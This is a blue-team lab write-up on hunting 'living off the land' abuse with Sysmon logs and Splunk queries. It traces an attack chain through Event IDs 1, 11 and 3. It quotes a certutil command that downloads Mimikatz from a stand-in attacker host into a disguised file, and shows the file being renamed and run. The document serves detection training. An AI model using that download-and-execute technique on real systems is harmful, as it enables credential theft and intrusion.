---
title: "LetsDefend: Threat Hunting with Sysmon"
tags: [letsdefend, blue-team, hunting, sysmon, certutil, lolbas]

description: "Proactive threat hunting using Sysmon logs. Detecting 'Living off the Land' binaries map exploits using Event IDs 1, 3, and 11."
---

# LetsDefend: Threat Hunting with Sysmon

**Scenario**: A user reports their PC is slow. AV is silent. We need to hunt manually.
**Tool**: Splunk (SIEM) + Sysmon Logs.

Sysmon (System Monitor) provides deep visibility into Windows activity that standard Event Logs miss. In this lab, we hunt for **LOLBAS** (Living Off The Land Binaries and Scripts)—where attackers use built-in Windows tools to download and execute malware.

---

## 1. Hypothesis Generation

Attackers often use `certutil.exe` (a certificate utility) to download files, because it is trusted by the OS and allowed through firewalls.
*   **Hypothesis**: An attacker used `certutil` to download a payload.
*   **Sysmon Event ID**: `1` (Process Creation).

---

## 2. The Hunt (Splunk Query)

We query the SIEM for `certutil` usage.

```splunk
index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*certutil.exe*"
```

**Results**:
We see a suspicious command line execution:
```cmd
certutil.exe -urlcache -split -f http://evil-server.com/mimikatz.exe C:\Temp\license.txt
```

### Analysis
1.  **`-urlcache -split -f`**: Standard flags for using certutil as a downloader.
2.  **`http://evil-server.com/mimikatz.exe`**: The source. It's blatantly named Mimikatz (a credential dumper).
3.  **`C:\Temp\license.txt`**: The destination. The attacker renamed the `.exe` to `.txt` to evade initial scanning.

---

## 3. Investigating the Payload (Event ID 11)

We want to know if the file was actually created. We check **Event ID 11** (File Create).

```splunk
index=main EventCode=11 TargetFilename="C:\\Temp\\license.txt"
```
**Result**: Confirmed. The file was written to disk at 14:32:01.

---

## 4. Execution & Persistence (Event ID 1)

Did the attacker run it? You can't run a `.txt` file directly. They likely renamed it back or executed it via a script.
We broaden our search for `license.txt` in command lines.

```splunk
index=main EventCode=1 CommandLine="*license.txt*"
```
**Finding**:
```cmd
cmd.exe /c move C:\Temp\license.txt C:\Temp\legit_update.exe
C:\Temp\legit_update.exe
```
They renamed it to `legit_update.exe` and executed it.

---

## 5. Network Connections (Event ID 3)

Finally, we check if the malware called home.

```splunk
index=main EventCode=3 Image="C:\\Temp\\legit_update.exe"
```
**Result**: Connection established to `45.33.22.11` (C2 Server) over port 443.

---

## Conclusion

We successfully reconstructed the attack chain using only Sysmon logs:
1.  **Delivery**: `certutil` download (Event 1).
2.  **Obfuscation**: Renaming `.exe` to `.txt` (Event 11).
3.  **Execution**: Renaming back and running (Event 1).
4.  **C2**: Network callback (Event 3).

This proves that `certutil` should be monitored closely in any environment. Blocking it from making outbound network connections is a high-fidelity defense.
